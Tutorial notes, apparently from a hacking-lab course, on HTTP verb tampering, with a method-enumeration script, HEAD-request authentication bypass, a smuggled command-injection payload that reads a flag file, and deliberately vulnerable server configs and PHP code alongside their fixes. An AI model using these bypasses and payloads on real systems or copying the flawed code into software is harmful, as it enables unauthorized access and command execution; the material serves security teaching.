### Content
* [Overview](#overview)
* [HTTP Verbs](#http-verbs)
* [Check allowed methods by a server](#check-allowed-methods-by-a-server)
* [Scenarios](#scenarios)
	* [Bypassing Basic Authentication](#bypassing-basic-authentication)
	* [Bypassing Security Filters](#bypassing-security-filters)
* [Verb Tampering Prevention](#verb-tampering-prevention)
	* [Insecure Configuration](#insecure-configuration)
	* [Insecure Coding](#insecure-coding)
---
## Overview
[HTTP Verb Tampering](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering)
- **Cause**: HTTP Verb Tampering occurs when an application has inconsistent or incomplete access control checks across different HTTP methods. For example, a resource may have proper authorization checks for `POST` requests but not for `PUT` or `DELETE` requests.
- **Exploitation**: Attackers send requests with unexpected or modified HTTP verbs (e.g., using `PUT` or `DELETE` instead of `GET` or `POST`) to interact with resources in unintended ways. For example, an attacker might change a `GET` request to `DELETE` to attempt deleting data or bypass access restrictions.
- **Impact**:
    - Unauthorized Data Modification
    - Privilege Escalation
    - Information Disclosure
- **Prevention**:
    - Consistent Access Control: Ensure that authorization checks are applied uniformly across all HTTP methods for each resource.
    - Allow Only Required Verbs: Restrict endpoints to allow only the HTTP verbs necessary for their functionality.
    - Server-Side Validation: Validate requests server-side based on user roles and permissions, regardless of HTTP verb.
---
## HTTP Verbs

| Method                                                                         | Description                                                                                                |
| ------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------- |
| [`GET`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/GET)         | Requests a representation of the specified resource                                                        |
| [`HEAD`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD)       | Asks for a response identical to a `GET` request, but without a response body                              |
| [`OPTIONS`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS) | Shows different options accepted by a web server, like accepted HTTP verbs                                 |
| [`TRACE`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/TRACE)     | Performs a message loop-back test along the path to the target resource                                    |
| [`PUT`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PUT)         | Writes the request payload to the specified location                                                       |
| [`DELETE`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/DELETE)   | Deletes the specified resource                                                                             |
| [`POST`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST)       | Submits an entity to the specified resource, often causing a change in state or side effects on the server |
| [`PATCH`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PATCH)     | Applies partial modifications to a resource                                                                |
| [`CONNECT`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/CONNECT) | Establishes a tunnel to the server identified by the target resource                                       |

---
## Check allowed methods by a server
``` bash
k1ng0a21r@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/

HTTP/1.1 200 OK
Date: 
Server: Apache/2.4.41 (Ubuntu)
Allow: POST,OPTIONS,HEAD,GET
Content-Length: 0
Content-Type: httpd/unix-directory
```
Script for automation:
``` bash
#!/bin/bash
for webservmethod in GET POST PUT TRACE CONNECT OPTIONS PROPFIND;
do
printf "$webservmethod " ;
printf "$webservmethod / HTTP/1.1\nHost: $1\n\n" | nc -q 1 $1 80 | grep "HTTP/1.1"
done
```
Usage:
``` bash
k1ng0a21r@htb[/htb]$ ./script 123.1.3.4
GET HTTP/1.1 200 OK
POST HTTP/1.1 200 OK
PUT HTTP/1.1 200 OK
TRACE HTTP/1.1 200 OK
CONNECT HTTP/1.1 400 Bad Request
OPTIONS HTTP/1.1 200 OK
PROPFIND HTTP/1.1 200 OK
```

---
## Scenarios
### Bypassing Basic Authentication
* `401 Unauthorized`
``` HTTP
GET /admin/reset.php? HTTP/1.1
```
* `Accepted`
``` HTTP
HEAD /admin/reset.php? HTTP/1.1
```
### Bypassing Security Filters
* Before HTTP verb tampering
``` HTTP
GET /index.php?filename=file%3b+cat+/flag.txt+ HTTP/1.1
....[SNIP]
```
Results on response:
``` HTML
h4><a href='test'>test</a></h4></li></ul>Malicious Request Denied!</ul>
```
* After HTTP verb tampering
``` HTTP
POST /index.php HTTP/1.1
...[SNIP]
filename=file%3b+cat+/flag.txt+
```
Result on response:
``` HTML
<h4><a href='test'>test</a></h4></li></ul>HTB{b3_v3rb_c0n51573n7}</ul>
```
---
## Verb Tampering Prevention
### Insecure Configuration
* `Apache` Vulnerable configurations.
 Located in the site configuration file (e.g. `000-default.conf`), or in a `.htaccess`.
``` XML
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```
the `Require valid-user` setting will only apply to `GET` requests, leaving the page accessible through other methods.
* `Tomcat` Vulnerable configurations.
  Located in the `web.xml` file for a certain Java web application.
``` XML
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
</security-constraint>
```
* `ASP.NET` Vulnerable configurations.
  Located in the `web.config` file of a web application.
``` XML
<system.web>
    <authorization>
        <allow verbs="GET" roles="admin">
            <deny verbs="GET" users="*">
        </deny>
        </allow>
    </authorization>
</system.web>
```
* If we want to specify a single method, we can use safe keywords:
	* `LimitExcept` in Apache 
	* `http-method-omission` in Tomcat
	* `add`/`remove` in ASP.NET
* We should generally `consider disabling/denying all HEAD requests` unless specifically required by the web application.
### Insecure Coding
Infected code
``` PHP
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```
* The code checks `$_REQUEST['filename']` but validates `$_POST['filename']`. An attacker can bypass the validation by sending the malicious input through `$_GET`.
* The fix would be to consistently use only `$_POST` for both validation and usage
---